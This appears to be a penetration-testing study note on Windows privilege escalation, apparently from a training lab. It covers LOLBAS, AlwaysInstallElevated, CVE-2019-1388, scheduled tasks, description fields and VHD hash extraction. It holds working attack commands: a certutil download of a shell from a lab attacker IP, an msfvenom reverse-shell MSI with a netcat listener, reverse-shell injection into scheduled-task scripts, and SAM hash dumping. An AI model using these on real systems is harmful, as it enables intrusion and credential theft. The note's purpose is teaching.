# Windows Privilege Escalation: Miscellaneous Techniques

## 1. Living Off The Land Binaries and Scripts (LOLBAS)

The LOLBAS project documents native or Microsoft-signed binaries, scripts, and libraries that exhibit unexpected functionality useful to an attacker (e.g., code execution, file transfers, evasion).

### Certutil.exe (File Transfer & Encoding)

- **Download a file to disk:**
    
    PowerShell
    
    ```
    certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
    ```
    
- **Base64 Encode a file:**
    
    DOS
    
    ```
    certutil -encode file1 encodedfile
    ```
    
- **Base64 Decode a file:**
    
    DOS
    
    ```
    certutil -decode encodedfile file2
    ```
    

### Rundll32.exe

- Used to execute arbitrary DLL files (local or hosted via an SMB share) to obtain capabilities like a reverse shell.
    

## 2. Always Install Elevated

If the `Always install with elevated privileges` policy is enabled under both Computer and User configurations, Windows Installer will install MSI packages with **NT AUTHORITY\SYSTEM** privileges.

### Enumeration

Verify if the registry keys are set to `0x1`:

PowerShell

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation

1. **Generate a malicious MSI package** on the attack machine:
    
    Bash
    
    ```
    msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
    ```
    
2. **Execute the MSI package silently** on the target:
    
    DOS
    
    ```
    msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
    ```
    
3. **Catch the reverse shell** using a Netcat listener (`nc -lnvp 9443`) to drop into a `SYSTEM` prompt.
    

## 3. CVE-2019-1388 (UAC Privilege Escalation)

A vulnerability in the Windows Certificate Dialog where user privileges are not properly enforced due to specific Object Identifier (OID) handling (`1.3.6.1.4.1.311.2.1.10` / `SPC_SP_AGENCY_INFO_OBJID`).

### Exploitation Workflow (GUI Required)

1. Right-click an old vulnerable Microsoft-signed executable (e.g., `hhupd.exe`) and select **Run as administrator**.
    
2. Click **Show information about the publisher's certificate**.
    
3. In the _General_ tab, click the hyperlink in the **Issued by** field, then close the dialog.
    
4. A browser window will launch running as **SYSTEM**.
    
5. Right-click inside the browser page -> **View page source**.
    
6. Right-click the page source tab -> **Save as**.
    
7. In the file path field of the _Save As_ dialog, type `c:\windows\system32\cmd.exe` and press Enter to spawn a `SYSTEM` command prompt.
    

## 4. Misconfigured Scheduled Tasks

Standard users cannot read tasks in `C:\Windows\System32\Tasks`, but administrators sometimes create custom scripts in custom directories with weak permissions.

### Enumeration

- **List tasks via CMD:** `schtasks /query /fo LIST /v`
    
- **List tasks via PowerShell:** `Get-ScheduledTask | select TaskName,State`
    
- **Check directory permissions** (e.g., using Sysinternals `accesschk`):
    
    DOS
    
    ```
    .\accesschk64.exe /accepteula -s -d C:\Scripts\
    ```
    

### Exploitation

If a script run by a high-privilege scheduled task (e.g., `db-backup.ps1`) is writeable by the `BUILTIN\Users` group:

1. Append malicious code (e.g., a reverse shell/beacon command) to the script.
    
2. Wait for the scheduled task to trigger automatically or overnight.
    

## 5. Description Fields (Information Disclosure)

Administrators sometimes leave sensitive information like credentials or configuration notes directly in active directories or local objects.

- **Enumerate Local User Descriptions:**
    
    PowerShell
    
    ```
    Get-LocalUser | select Name, Description
    ```
    
- **Enumerate Computer Descriptions:**
    
    PowerShell
    
    ```
    Get-WmiObject -Class Win32_OperatingSystem | select Description
    ```
    

## 6. Mounting Virtual Hard Disks (VHDX/VMDK)

If backup files (`.vhd`, `.vhdx`, `.vmdk`) are discovered on accessible network shares, they can be mounted to pull offline registry hives and extract credentials.

### Mounting on Linux (Attack Box)

- **Mount VMDK:**
    
    Bash
    
    ```
    guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
    ```
    
- **Mount VHD/VHDX:**
    
    Bash
    
    ```
    guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
    ```
    

### Hash Extraction

Once the drive is mounted, navigate to `C:\Windows\System32\Config`, copy the `SAM`, `SECURITY`, and `SYSTEM` hives, and dump the local NTLM password hashes using `secretsdump.py`:

Bash

```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

